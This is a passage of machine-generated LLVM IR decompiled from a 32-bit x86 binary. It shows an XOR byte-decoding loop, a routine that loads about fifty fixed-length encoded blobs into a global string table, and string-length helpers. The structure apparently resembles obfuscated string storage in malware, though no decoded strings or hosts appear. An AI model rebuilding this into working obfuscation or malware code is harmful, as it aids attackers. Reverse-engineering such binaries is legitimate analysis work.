  %v0_805139a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805139a = inttoptr i32 %v0_805139a to i32*
  %v2_805139a = load i32, i32* %v1_805139a, align 4
  %v2_805139c = add i32 %v2_805139a, %v0_8051398
  %v0_805139e = load i32, i32* %esi.global-to-local, align 4
  %v1_80513a0 = inttoptr i32 %v2_805139c to i8*
  %v2_80513a0 = load i8, i8* %v1_80513a0, align 1
  %v4_80513a0 = trunc i32 %v0_805139e to i8
  %v5_80513a0 = xor i8 %v2_80513a0, %v4_80513a0
  store i8 %v5_80513a0, i8* %v1_80513a0, align 1
  %v0_80513a2 = load i32, i32* %edx.global-to-local, align 4
  %v0_80513a4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80513a4 = inttoptr i32 %v0_80513a4 to i32*
  %v2_80513a4 = load i32, i32* %v1_80513a4, align 4
  %v1_80513a6 = add i32 %v0_80513a2, 1
  store i32 %v1_80513a6, i32* %edx.global-to-local, align 4
  %v2_80513a7 = add i32 %v2_80513a4, %v0_80513a2
  %v2_80513a9 = load i8, i8* %stack_var_-44, align 1
  %v1_80513ac = inttoptr i32 %v2_80513a7 to i8*
  %v2_80513ac = load i8, i8* %v1_80513ac, align 1
  %v5_80513ac = xor i8 %v2_80513ac, %v2_80513a9
  store i8 %v5_80513ac, i8* %v1_80513ac, align 1
  %v0_80513ae = load i32, i32* %ecx.global-to-local, align 4
  %v1_80513ae = add i32 %v0_80513ae, 4
  %v2_80513ae = inttoptr i32 %v1_80513ae to i32*
  %v3_80513ae = load i32, i32* %v2_80513ae, align 4
  %v1_80513b1 = urem i32 %v3_80513ae, 65536
  %v1_80513b6 = load i32, i32* %edx.global-to-local, align 4
  %v8_80513b8 = icmp sgt i32 %v1_80513b1, %v1_80513b6
  br i1 %v8_80513b8, label %dec_label_pc_8051384.dec_label_pc_8051384_crit_edge, label %dec_label_pc_80513ba.loopexit

dec_label_pc_8051384.dec_label_pc_8051384_crit_edge: ; preds = %dec_label_pc_8051384
  %v0_805138a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051384

dec_label_pc_80513ba.loopexit:                    ; preds = %dec_label_pc_8051384
  br label %dec_label_pc_80513ba

dec_label_pc_80513ba:                             ; preds = %dec_label_pc_80513ba.loopexit, %dec_label_pc_8051350
  %v0_80513c1 = phi i32 [ %v1_80513b1, %dec_label_pc_80513ba.loopexit ], [ %v1_8051364, %dec_label_pc_8051350 ]
  ret i32 %v0_80513c1

; uselistorder directives
  uselistorder i32 %v1_80513b6, { 1, 0 }
  uselistorder i32 %v1_80513b1, { 1, 0 }
  uselistorder i32 %v0_80513ae, { 1, 0 }
  uselistorder i32 %v1_8051364, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8056a00.52 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_805687c.53, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8056a00.52 to i32), { 1, 2, 3, 0 }
}

define i32 @function_80513d0() local_unnamed_addr {
dec_label_pc_80513d0:
  %v1_80513d6 = call i32 @function_8052bd4(i32 18)
  store i32 %v1_80513d6, i32* @ebx, align 4
  %v4_80513e8 = call i32 @function_8051d00(i32 %v1_80513d6, i32 ptrtoint ([19 x i8]* @global_var_8054db0.54 to i32), i32 18)
  %v0_80513ed = load i32, i32* @ebx, align 4
  store i32 %v0_80513ed, i32* @global_var_8056a18.55, align 8
  store i16 18, i16* bitcast (i32* @global_var_8056a1c.56 to i16*), align 4
  %v1_8051403 = call i32 @function_8052bd4(i32 2)
  store i32 %v1_8051403, i32* @ebx, align 4
  %v4_8051415 = call i32 @function_8051d00(i32 %v1_8051403, i32 ptrtoint ([3 x i8]* @global_var_8054dc3.57 to i32), i32 2)
  %v0_805141a = load i32, i32* @ebx, align 4
  store i32 %v0_805141a, i32* @global_var_8056a20.58, align 32
  store i16 2, i16* bitcast (i32* @global_var_8056a24.59 to i16*), align 4
  %v1_8051430 = call i32 @function_8052bd4(i32 18)
  store i32 %v1_8051430, i32* @ebx, align 4
  %v4_8051442 = call i32 @function_8051d00(i32 %v1_8051430, i32 ptrtoint ([19 x i8]* @global_var_8054db0.54 to i32), i32 18)
  %v0_8051447 = load i32, i32* @ebx, align 4
  store i32 %v0_8051447, i32* @global_var_8056a90.60, align 16
  store i16 18, i16* bitcast (i32* @global_var_8056a94.61 to i16*), align 4
  %v1_805145d = call i32 @function_8052bd4(i32 2)
  store i32 %v1_805145d, i32* @ebx, align 4
  %v4_805146f = call i32 @function_8051d00(i32 %v1_805145d, i32 ptrtoint (i32* @global_var_8054dc6.62 to i32), i32 2)
  %v0_8051474 = load i32, i32* @ebx, align 4
  store i32 %v0_8051474, i32* @global_var_8056a98.63, align 8
  store i16 2, i16* bitcast (i32* @global_var_8056a9c.64 to i16*), align 4
  %v1_805148a = call i32 @function_8052bd4(i32 15)
  store i32 %v1_805148a, i32* @ebx, align 4
  %v4_805149c = call i32 @function_8051d00(i32 %v1_805148a, i32 ptrtoint (i32* @global_var_8054dc9.65 to i32), i32 15)
  %v0_80514a1 = load i32, i32* @ebx, align 4
  store i32 %v0_80514a1, i32* @global_var_8056a10.66, align 16
  store i16 15, i16* bitcast (i32* @global_var_8056a14.67 to i16*), align 4
  %v1_80514b7 = call i32 @function_8052bd4(i32 29)
  store i32 %v1_80514b7, i32* @ebx, align 4
  %v4_80514c9 = call i32 @function_8051d00(i32 %v1_80514b7, i32 ptrtoint (i32* @global_var_8054dd9.68 to i32), i32 29)
  %v0_80514ce = load i32, i32* @ebx, align 4
  store i32 %v0_80514ce, i32* @global_var_8056a28.69, align 8
  store i16 29, i16* bitcast (i32* @global_var_8056a2c.70 to i16*), align 4
  %v1_80514e4 = call i32 @function_8052bd4(i32 7)
  store i32 %v1_80514e4, i32* @ebx, align 4
  %v4_80514f6 = call i32 @function_8051d00(i32 %v1_80514e4, i32 ptrtoint ([8 x i8]* @global_var_8054df7.71 to i32), i32 7)
  %v0_80514fb = load i32, i32* @ebx, align 4
  store i32 %v0_80514fb, i32* @global_var_8056a30.72, align 16
  store i16 7, i16* bitcast (i32* @global_var_8056a34.73 to i16*), align 4
  %v1_8051511 = call i32 @function_8052bd4(i32 5)
  store i32 %v1_8051511, i32* @ebx, align 4
  %v4_8051523 = call i32 @function_8051d00(i32 %v1_8051511, i32 ptrtoint ([6 x i8]* @global_var_8054dff.74 to i32), i32 5)
  %v0_8051528 = load i32, i32* @ebx, align 4
  store i32 %v0_8051528, i32* @global_var_8056a38.75, align 8
  store i16 5, i16* bitcast (i32* @global_var_8056a3c.76 to i16*), align 4
  %v1_805153e = call i32 @function_8052bd4(i32 11)
  store i32 %v1_805153e, i32* @ebx, align 4
  %v4_8051550 = call i32 @function_8051d00(i32 %v1_805153e, i32 ptrtoint (i32* @global_var_8054e05.77 to i32), i32 11)
  %v0_8051555 = load i32, i32* @ebx, align 4
  store i32 %v0_8051555, i32* @global_var_8056a40.78, align 64
  store i16 11, i16* bitcast (i32* @global_var_8056a44.79 to i16*), align 4
  %v1_805156b = call i32 @function_8052bd4(i32 4)
  store i32 %v1_805156b, i32* @ebx, align 4
  %v4_805157d = call i32 @function_8051d00(i32 %v1_805156b, i32 ptrtoint ([5 x i8]* @global_var_8054e11.80 to i32), i32 4)
  %v0_8051582 = load i32, i32* @ebx, align 4
  store i32 %v0_8051582, i32* @global_var_8056a48.81, align 8
  store i16 4, i16* bitcast (i32* @global_var_8056a4c.82 to i16*), align 4
  %v1_8051598 = call i32 @function_8052bd4(i32 7)
  store i32 %v1_8051598, i32* @ebx, align 4
  %v4_80515aa = call i32 @function_8051d00(i32 %v1_8051598, i32 ptrtoint ([8 x i8]* @global_var_8054e16.83 to i32), i32 7)
  %v0_80515af = load i32, i32* @ebx, align 4
  store i32 %v0_80515af, i32* @global_var_8056a50.84, align 16
  store i16 7, i16* bitcast (i32* @global_var_8056a54.85 to i16*), align 4
  %v1_80515c5 = call i32 @function_8052bd4(i32 8)
  store i32 %v1_80515c5, i32* @ebx, align 4
  %v4_80515d7 = call i32 @function_8051d00(i32 %v1_80515c5, i32 ptrtoint ([9 x i8]* @global_var_8054e1e.86 to i32), i32 8)
  %v0_80515dc = load i32, i32* @ebx, align 4
  store i32 %v0_80515dc, i32* @global_var_8056a58.87, align 8
  store i16 8, i16* bitcast (i32* @global_var_8056a5c.88 to i16*), align 4
  %v1_80515f2 = call i32 @function_8052bd4(i32 13)
  store i32 %v1_80515f2, i32* @ebx, align 4
  %v4_8051604 = call i32 @function_8051d00(i32 %v1_80515f2, i32 ptrtoint (i32* @global_var_8054e27.89 to i32), i32 13)
  %v0_8051609 = load i32, i32* @ebx, align 4
  store i32 %v0_8051609, i32* @global_var_8056a60.90, align 32
  store i16 13, i16* bitcast (i32* @global_var_8056a64.91 to i16*), align 4
  %v1_805161f = call i32 @function_8052bd4(i32 10)
  store i32 %v1_805161f, i32* @ebx, align 4
  %v4_8051631 = call i32 @function_8051d00(i32 %v1_805161f, i32 ptrtoint ([11 x i8]* @global_var_8054e35.92 to i32), i32 10)
  %v0_8051636 = load i32, i32* @ebx, align 4
  store i32 %v0_8051636, i32* @global_var_8056a68.93, align 8
  store i16 10, i16* bitcast (i32* @global_var_8056a6c.94 to i16*), align 4
  %v1_805164c = call i32 @function_8052bd4(i32 10)
  store i32 %v1_805164c, i32* @ebx, align 4
  %v4_805165e = call i32 @function_8051d00(i32 %v1_805164c, i32 ptrtoint ([11 x i8]* @global_var_8054e40.95 to i32), i32 10)
  %v0_8051663 = load i32, i32* @ebx, align 4
  store i32 %v0_8051663, i32* @global_var_8056a70.96, align 16
  store i16 10, i16* bitcast (i32* @global_var_8056a74.97 to i16*), align 4
  %v1_8051679 = call i32 @function_8052bd4(i32 33)
  store i32 %v1_8051679, i32* @ebx, align 4
  %v4_805168b = call i32 @function_8051d00(i32 %v1_8051679, i32 ptrtoint (i32* @global_var_8054fc0.98 to i32), i32 33)
  %v0_8051690 = load i32, i32* @ebx, align 4
  store i32 %v0_8051690, i32* @global_var_8056a78.99, align 8
  store i16 33, i16* bitcast (i32* @global_var_8056a7c.100 to i16*), align 4
  %v1_80516a6 = call i32 @function_8052bd4(i32 8)
  store i32 %v1_80516a6, i32* @ebx, align 4
  %v4_80516b8 = call i32 @function_8051d00(i32 %v1_80516a6, i32 ptrtoint ([9 x i8]* @global_var_8054e4b.101 to i32), i32 8)
  %v0_80516bd = load i32, i32* @ebx, align 4
  store i32 %v0_80516bd, i32* @global_var_8056a80.102, align 128
  store i16 8, i16* bitcast (i32* @global_var_8056a84.103 to i16*), align 4
  %v1_80516d3 = call i32 @function_8052bd4(i32 11)
  store i32 %v1_80516d3, i32* @ebx, align 4
  %v4_80516e5 = call i32 @function_8051d00(i32 %v1_80516d3, i32 ptrtoint ([12 x i8]* @global_var_8054e54.104 to i32), i32 11)
  %v0_80516ea = load i32, i32* @ebx, align 4
  store i32 %v0_80516ea, i32* @global_var_8056a88.105, align 8
  store i16 11, i16* bitcast (i32* @global_var_8056a8c.106 to i16*), align 4
  %v1_8051700 = call i32 @function_8052bd4(i32 6)
  store i32 %v1_8051700, i32* @ebx, align 4
  %v4_8051712 = call i32 @function_8051d00(i32 %v1_8051700, i32 ptrtoint ([7 x i8]* @global_var_8054e60.107 to i32), i32 6)
  %v0_8051717 = load i32, i32* @ebx, align 4
  store i32 %v0_8051717, i32* @global_var_8056aa0.108, align 32
  store i16 6, i16* bitcast (i32* @global_var_8056aa4.109 to i16*), align 4
  %v1_805172d = call i32 @function_8052bd4(i32 7)
  store i32 %v1_805172d, i32* @ebx, align 4
  %v4_805173f = call i32 @function_8051d00(i32 %v1_805172d, i32 ptrtoint ([8 x i8]* @global_var_8054e67.110 to i32), i32 7)
  %v0_8051744 = load i32, i32* @ebx, align 4
  store i32 %v0_8051744, i32* @global_var_8056aa8.111, align 8
  store i16 7, i16* bitcast (i32* @global_var_8056aac.112 to i16*), align 4
  %v1_805175a = call i32 @function_8052bd4(i32 7)
  store i32 %v1_805175a, i32* @ebx, align 4
  %v4_805176c = call i32 @function_8051d00(i32 %v1_805175a, i32 ptrtoint ([8 x i8]* @global_var_8054e6f.113 to i32), i32 7)
  %v0_8051771 = load i32, i32* @ebx, align 4
  store i32 %v0_8051771, i32* @global_var_8056ab0.114, align 16
  store i16 7, i16* bitcast (i32* @global_var_8056ab4.115 to i16*), align 4
  %v1_8051787 = call i32 @function_8052bd4(i32 3)
  store i32 %v1_8051787, i32* @ebx, align 4
  %v4_8051799 = call i32 @function_8051d00(i32 %v1_8051787, i32 ptrtoint ([4 x i8]* @global_var_8054e77.116 to i32), i32 3)
  %v0_805179e = load i32, i32* @ebx, align 4
  store i32 %v0_805179e, i32* @global_var_8056ab8.117, align 8
  store i16 3, i16* bitcast (i32* @global_var_8056abc.118 to i16*), align 4
  %v1_80517b4 = call i32 @function_8052bd4(i32 19)
  store i32 %v1_80517b4, i32* @ebx, align 4
  %v4_80517c6 = call i32 @function_8051d00(i32 %v1_80517b4, i32 ptrtoint (i32* @global_var_8054e7b.119 to i32), i32 19)
  %v0_80517cb = load i32, i32* @ebx, align 4
  store i32 %v0_80517cb, i32* @global_var_8056ac0.120, align 64
  store i16 19, i16* bitcast (i32* @global_var_8056ac4.121 to i16*), align 4
  %v1_80517e1 = call i32 @function_8052bd4(i32 24)
  store i32 %v1_80517e1, i32* @ebx, align 4
  %v4_80517f3 = call i32 @function_8051d00(i32 %v1_80517e1, i32 ptrtoint (i32* @global_var_8054e8f.122 to i32), i32 24)
  %v0_80517f8 = load i32, i32* @ebx, align 4
  store i32 %v0_80517f8, i32* @global_var_8056ac8.123, align 8
  store i16 24, i16* bitcast (i32* @global_var_8056acc.124 to i16*), align 4
  %v1_805180e = call i32 @function_8052bd4(i32 9)
  store i32 %v1_805180e, i32* @ebx, align 4
  %v4_8051820 = call i32 @function_8051d00(i32 %v1_805180e, i32 ptrtoint ([10 x i8]* @global_var_8054ea8.125 to i32), i32 9)
  %v0_8051825 = load i32, i32* @ebx, align 4
  store i32 %v0_8051825, i32* @global_var_8056ad0.126, align 16
  store i16 9, i16* bitcast (i32* @global_var_8056ad4.127 to i16*), align 4
  %v1_805183b = call i32 @function_8052bd4(i32 16)
  store i32 %v1_805183b, i32* @ebx, align 4
  %v4_805184d = call i32 @function_8051d00(i32 %v1_805183b, i32 ptrtoint (i32* @global_var_8054eb2.128 to i32), i32 16)
  %v0_8051852 = load i32, i32* @ebx, align 4
  store i32 %v0_8051852, i32* @global_var_8056ad8.129, align 8
  store i16 16, i16* bitcast (i32* @global_var_8056adc.130 to i16*), align 4
  %v1_8051868 = call i32 @function_8052bd4(i32 22)
  store i32 %v1_8051868, i32* @ebx, align 4
  %v4_805187a = call i32 @function_8051d00(i32 %v1_8051868, i32 ptrtoint (i32* @global_var_8054ec3.131 to i32), i32 22)
  %v0_805187f = load i32, i32* @ebx, align 4
  store i32 %v0_805187f, i32* @global_var_8056ae0.132, align 32
  store i16 22, i16* bitcast (i32* @global_var_8056ae4.133 to i16*), align 4
  %v1_8051895 = call i32 @function_8052bd4(i32 21)
  store i32 %v1_8051895, i32* @ebx, align 4
  %v4_80518a7 = call i32 @function_8051d00(i32 %v1_8051895, i32 ptrtoint (i32* @global_var_8054eda.134 to i32), i32 21)
  %v0_80518ac = load i32, i32* @ebx, align 4
  store i32 %v0_80518ac, i32* @global_var_8056ae8.135, align 8
  store i16 21, i16* bitcast (i32* @global_var_8056aec.136 to i16*), align 4
  %v1_80518c2 = call i32 @function_8052bd4(i32 17)
  store i32 %v1_80518c2, i32* @ebx, align 4
  %v4_80518d4 = call i32 @function_8051d00(i32 %v1_80518c2, i32 ptrtoint ([18 x i8]* @global_var_8054ef0.137 to i32), i32 17)
  %v0_80518d9 = load i32, i32* @ebx, align 4
  store i32 %v0_80518d9, i32* @global_var_8056af0.138, align 16
  store i16 17, i16* bitcast (i32* @global_var_8056af4.139 to i16*), align 4
  %v1_80518ef = call i32 @function_8052bd4(i32 12)
  store i32 %v1_80518ef, i32* @ebx, align 4
  %v4_8051901 = call i32 @function_8051d00(i32 %v1_80518ef, i32 ptrtoint (i32* @global_var_8054f02.140 to i32), i32 12)
  %v0_8051906 = load i32, i32* @ebx, align 4
  store i32 %v0_8051906, i32* @global_var_8056af8.141, align 8
  store i16 12, i16* bitcast (i32* @global_var_8056afc.142 to i16*), align 4
  %v1_805191c = call i32 @function_8052bd4(i32 23)
  store i32 %v1_805191c, i32* @ebx, align 4
  %v4_805192e = call i32 @function_8051d00(i32 %v1_805191c, i32 ptrtoint (i32* @global_var_8054f0f.143 to i32), i32 23)
  %v0_8051933 = load i32, i32* @ebx, align 4
  store i32 %v0_8051933, i32* @global_var_8056b00.144, align 256
  store i16 23, i16* bitcast (i32* @global_var_8056b04.145 to i16*), align 4
  %v1_8051949 = call i32 @function_8052bd4(i32 83)
  store i32 %v1_8051949, i32* @ebx, align 4
  %v4_805195b = call i32 @function_8051d00(i32 %v1_8051949, i32 ptrtoint (i32* @global_var_8054fe4.146 to i32), i32 83)
  %v0_8051960 = load i32, i32* @ebx, align 4
  store i32 %v0_8051960, i32* @global_var_8056b08.147, align 8
  store i16 83, i16* bitcast (i32* @global_var_8056b0c.148 to i16*), align 4
  %v1_8051976 = call i32 @function_8052bd4(i32 32)
  store i32 %v1_8051976, i32* @ebx, align 4
  %v4_8051988 = call i32 @function_8051d00(i32 %v1_8051976, i32 ptrtoint (i32* @global_var_8055038.149 to i32), i32 32)
  %v0_805198d = load i32, i32* @ebx, align 4
  store i32 %v0_805198d, i32* @global_var_8056b10.150, align 16
  store i16 32, i16* bitcast (i32* @global_var_8056b14.151 to i16*), align 4
  %v1_80519a3 = call i32 @function_8052bd4(i32 48)
  store i32 %v1_80519a3, i32* @ebx, align 4
  %v4_80519b5 = call i32 @function_8051d00(i32 %v1_80519a3, i32 ptrtoint (i32* @global_var_805505c.152 to i32), i32 48)
  %v0_80519ba = load i32, i32* @ebx, align 4
  store i32 %v0_80519ba, i32* @global_var_8056b18.153, align 8
  store i16 48, i16* bitcast (i32* @global_var_8056b1c.154 to i16*), align 4
  %v1_80519d0 = call i32 @function_8052bd4(i32 12)
  store i32 %v1_80519d0, i32* @ebx, align 4
  %v4_80519e2 = call i32 @function_8051d00(i32 %v1_80519d0, i32 ptrtoint (i32* @global_var_8054f27.155 to i32), i32 12)
  %v0_80519e7 = load i32, i32* @ebx, align 4
  store i32 %v0_80519e7, i32* @global_var_8056b20.156, align 32
  store i16 12, i16* bitcast (i32* @global_var_8056b24.157 to i16*), align 4
  %v1_80519fd = call i32 @function_8052bd4(i32 9)
  store i32 %v1_80519fd, i32* @ebx, align 4
  %v4_8051a0f = call i32 @function_8051d00(i32 %v1_80519fd, i32 ptrtoint (i32* @global_var_8054f34.158 to i32), i32 9)
  %v0_8051a14 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a14, i32* @global_var_8056b28.159, align 8
  store i16 9, i16* bitcast (i32* @global_var_8056b2c.160 to i16*), align 4
  %v1_8051a2a = call i32 @function_8052bd4(i32 10)
  store i32 %v1_8051a2a, i32* @ebx, align 4
  %v4_8051a3c = call i32 @function_8051d00(i32 %v1_8051a2a, i32 ptrtoint (i32* @global_var_8054f3e.161 to i32), i32 10)
  %v0_8051a41 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a41, i32* @global_var_8056b30.162, align 16
  store i16 10, i16* bitcast (i32* @global_var_8056b34.163 to i16*), align 4
  %v1_8051a57 = call i32 @function_8052bd4(i32 12)
  store i32 %v1_8051a57, i32* @ebx, align 4
  %v4_8051a69 = call i32 @function_8051d00(i32 %v1_8051a57, i32 ptrtoint (i32* @global_var_8054f49.164 to i32), i32 12)
  %v0_8051a6e = load i32, i32* @ebx, align 4
  store i32 %v0_8051a6e, i32* @global_var_8056b38.165, align 8
  store i16 12, i16* bitcast (i32* @global_var_8056b3c.166 to i16*), align 4
  %v1_8051a84 = call i32 @function_8052bd4(i32 16)
  store i32 %v1_8051a84, i32* @ebx, align 4
  %v4_8051a96 = call i32 @function_8051d00(i32 %v1_8051a84, i32 ptrtoint (i32* @global_var_8054f56.167 to i32), i32 16)
  %v0_8051a9b = load i32, i32* @ebx, align 4
  store i32 %v0_8051a9b, i32* @global_var_8056b40.168, align 64
  store i16 16, i16* bitcast (i32* @global_var_8056b44.169 to i16*), align 4
  %v1_8051ab1 = call i32 @function_8052bd4(i32 19)
  store i32 %v1_8051ab1, i32* @ebx, align 4
  %v4_8051ac3 = call i32 @function_8051d00(i32 %v1_8051ab1, i32 ptrtoint (i32* @global_var_8054f67.170 to i32), i32 19)
  %v0_8051ac8 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ac8, i32* @global_var_8056b48.171, align 8
  store i16 19, i16* bitcast (i32* @global_var_8056b4c.172 to i16*), align 4
  %v1_8051ade = call i32 @function_8052bd4(i32 8)
  store i32 %v1_8051ade, i32* @ebx, align 4
  %v4_8051af0 = call i32 @function_8051d00(i32 %v1_8051ade, i32 ptrtoint ([9 x i8]* @global_var_8054f7b.173 to i32), i32 8)
  %v0_8051af5 = load i32, i32* @ebx, align 4
  store i32 %v0_8051af5, i32* @global_var_8056b50.174, align 16
  store i16 8, i16* bitcast (i32* @global_var_8056b54.175 to i16*), align 4
  %v1_8051b0b = call i32 @function_8052bd4(i32 11)
  store i32 %v1_8051b0b, i32* @ebx, align 4
  %v4_8051b1d = call i32 @function_8051d00(i32 %v1_8051b0b, i32 ptrtoint (i32* @global_var_8054f1b.176 to i32), i32 11)
  %v0_8051b22 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b22, i32* @global_var_8056b58.177, align 8
  store i16 11, i16* bitcast (i32* @global_var_8056b5c.178 to i16*), align 4
  %v1_8051b38 = call i32 @function_8052bd4(i32 12)
  store i32 %v1_8051b38, i32* @ebx, align 4
  %v4_8051b4a = call i32 @function_8051d00(i32 %v1_8051b38, i32 ptrtoint (i32* @global_var_8054f84.179 to i32), i32 12)
  %v0_8051b4f = load i32, i32* @ebx, align 4
  store i32 %v0_8051b4f, i32* @global_var_8056b60.180, align 32
  store i16 12, i16* bitcast (i32* @global_var_8056b64.181 to i16*), align 4
  %v1_8051b65 = call i32 @function_8052bd4(i32 18)
  store i32 %v1_8051b65, i32* @ebx, align 4
  %v4_8051b77 = call i32 @function_8051d00(i32 %v1_8051b65, i32 ptrtoint (i32* @global_var_8054f91.182 to i32), i32 18)
  %v0_8051b7c = load i32, i32* @ebx, align 4
  store i32 %v0_8051b7c, i32* @global_var_8056b68.183, align 8
  store i16 18, i16* bitcast (i32* @global_var_8056b6c.184 to i16*), align 4
  %v1_8051b92 = call i32 @function_8052bd4(i32 25)
  store i32 %v1_8051b92, i32* @ebx, align 4
  %v4_8051ba4 = call i32 @function_8051d00(i32 %v1_8051b92, i32 ptrtoint (i32* @global_var_8054fa4.185 to i32), i32 25)
  %v0_8051ba9 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ba9, i32* @global_var_8056b70.186, align 16
  store i16 25, i16* bitcast (i32* @global_var_8056b74.187 to i16*), align 4
  %v1_8051bbf = call i32 @function_8052bd4(i32 111)
  store i32 %v1_8051bbf, i32* @ebx, align 4
  %v4_8051bd1 = call i32 @function_8051d00(i32 %v1_8051bbf, i32 ptrtoint (i32* @global_var_8055090.188 to i32), i32 111)
  %v0_8051bd6 = load i32, i32* @ebx, align 4
  store i32 %v0_8051bd6, i32* @global_var_8056b78.189, align 8
  store i16 111, i16* bitcast (i32* @global_var_8056b7c.190 to i16*), align 4
  %v1_8051bec = call i32 @function_8052bd4(i32 111)
  store i32 %v1_8051bec, i32* @ebx, align 4
  %v4_8051bfe = call i32 @function_8051d00(i32 %v1_8051bec, i32 ptrtoint (i32* @global_var_8055100.191 to i32), i32 111)
  %v0_8051c03 = load i32, i32* @ebx, align 4
  store i32 %v0_8051c03, i32* @global_var_8056b80.192, align 128
  store i16 111, i16* bitcast (i32* @global_var_8056b84.193 to i16*), align 4
  %v1_8051c19 = call i32 @function_8052bd4(i32 110)
  store i32 %v1_8051c19, i32* @ebx, align 4
  %v4_8051c2b = call i32 @function_8051d00(i32 %v1_8051c19, i32 ptrtoint (i32* @global_var_8055170.194 to i32), i32 110)
  %v0_8051c30 = load i32, i32* @ebx, align 4
  store i32 %v0_8051c30, i32* @global_var_8056b88.195, align 8
  store i16 110, i16* bitcast (i32* @global_var_8056b8c.196 to i16*), align 4
  %v1_8051c46 = call i32 @function_8052bd4(i32 110)
  store i32 %v1_8051c46, i32* @ebx, align 4
  %v4_8051c58 = call i32 @function_8051d00(i32 %v1_8051c46, i32 ptrtoint (i32* @global_var_80551e0.197 to i32), i32 110)
  %v0_8051c5d = load i32, i32* @ebx, align 4
  store i32 %v0_8051c5d, i32* @global_var_8056b90.198, align 16
  store i16 110, i16* bitcast (i32* @global_var_8056b94.199 to i16*), align 4
  %v1_8051c73 = call i32 @function_8052bd4(i32 117)
  store i32 %v1_8051c73, i32* @ebx, align 4
  %v4_8051c85 = call i32 @function_8051d00(i32 %v1_8051c73, i32 ptrtoint (i32* @global_var_8055250.200 to i32), i32 117)
  %v0_8051c8a = load i32, i32* @ebx, align 4
  store i32 %v0_8051c8a, i32* @global_var_8056b98.201, align 8
  store i16 117, i16* bitcast (i32* @global_var_8056b9c.202 to i16*), align 4
  ret i32 %v4_8051c85

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @function_8051d00, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_8051ca0(i8* %arg1) local_unnamed_addr {
dec_label_pc_8051ca0:
  %v4_8051ca0 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051ca0, i32* @edx, align 4
  %v2_8051ca6 = load i8, i8* %arg1, align 1
  %v3_8051ca6 = icmp eq i8 %v2_8051ca6, 0
  br i1 %v3_8051ca6, label %dec_label_pc_8051cb7, label %dec_label_pc_8051cb0

dec_label_pc_8051cb0:                             ; preds = %dec_label_pc_8051ca0, %dec_label_pc_8051cb0
  %v0_8051cb0 = phi i32 [ %v1_8051cb0, %dec_label_pc_8051cb0 ], [ 0, %dec_label_pc_8051ca0 ]
  %v1_8051cb0 = add i32 %v0_8051cb0, 1
  %v2_8051cb1 = add i32 %v1_8051cb0, %v4_8051ca0
  %v3_8051cb1 = inttoptr i32 %v2_8051cb1 to i8*
  %v4_8051cb1 = load i8, i8* %v3_8051cb1, align 1
  %v5_8051cb1 = icmp eq i8 %v4_8051cb1, 0
  %v1_8051cb5 = icmp eq i1 %v5_8051cb1, false
  br i1 %v1_8051cb5, label %dec_label_pc_8051cb0, label %dec_label_pc_8051cb7

dec_label_pc_8051cb7:                             ; preds = %dec_label_pc_8051cb0, %dec_label_pc_8051ca0
  %v0_8051cb7 = phi i32 [ 0, %dec_label_pc_8051ca0 ], [ %v1_8051cb0, %dec_label_pc_8051cb0 ]
  ret i32 %v0_8051cb7

; uselistorder directives
  uselistorder label %dec_label_pc_8051cb0, { 1, 0 }
}

define i32 @function_8051cc0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051cc0:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp15 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051cc1 = load i32, i32* @ebx, align 4
  store i32 %v0_8051cc1, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v4_8051cc6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051cc6, i32* %edx.global-to-local, align 4
  %v2_8051cca = load i8, i8* %tmp15, align 1
  %v3_8051cca = icmp eq i8 %v2_8051cca, 0
  br i1 %v3_8051cca, label %dec_label_pc_8051cf4, label %dec_label_pc_8051ccf

dec_label_pc_8051ccf:                             ; preds = %dec_label_pc_8051cc0
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051cd1

dec_label_pc_8051cd1:                             ; preds = %dec_label_pc_8051cd1, %dec_label_pc_8051ccf
  %v0_8051cd1 = phi i32 [ %v1_8051cd1, %dec_label_pc_8051cd1 ], [ 0, %dec_label_pc_8051ccf ]
  %v1_8051cd1 = add i32 %v0_8051cd1, 1
  store i32 %v1_8051cd1, i32* %esi.global-to-local, align 4
  %v2_8051cd2 = add i32 %v1_8051cd1, %arg2
  %v3_8051cd2 = inttoptr i32 %v2_8051cd2 to i8*
  %v4_8051cd2 = load i8, i8* %v3_8051cd2, align 1
  %v5_8051cd2 = icmp eq i8 %v4_8051cd2, 0
  %v1_8051cd6 = icmp eq i1 %v5_8051cd2, false
  br i1 %v1_8051cd6, label %dec_label_pc_8051cd1, label %dec_label_pc_8051cd8

dec_label_pc_8051cd8:                             ; preds = %dec_label_pc_8051cd1
  %v10_8051cd8 = icmp eq i32 %v0_8051cd1, -2
  br i1 %v10_8051cd8, label %dec_label_pc_8051cef, label %dec_label_pc_8051cdd

dec_label_pc_8051cdd:                             ; preds = %dec_label_pc_8051cd8
  store i32 %v4_8051cc6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %v1_8051cd1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051ce3

